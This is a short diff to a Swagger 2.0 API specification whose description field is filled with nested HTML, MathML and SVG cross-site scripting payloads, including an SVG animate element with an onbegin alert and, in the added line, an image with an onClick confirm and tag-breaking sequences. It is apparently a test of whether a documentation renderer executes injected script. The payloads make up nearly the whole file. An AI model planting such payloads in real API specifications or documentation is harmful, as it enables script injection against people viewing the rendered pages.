@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><h1>BU0</h1><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
+  description: <form><math><h1>BU0</h1>"><desc id="</textarea></script></object><form'<textarea></section>'<img src=x onClick=confirm(1)"><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
     onbegin="alert('XSS1')"/><mtext><h1>BU1</h1><textarea><desc id="</textarea><math><mtext><h1>BU</h1>">
 
   version: production
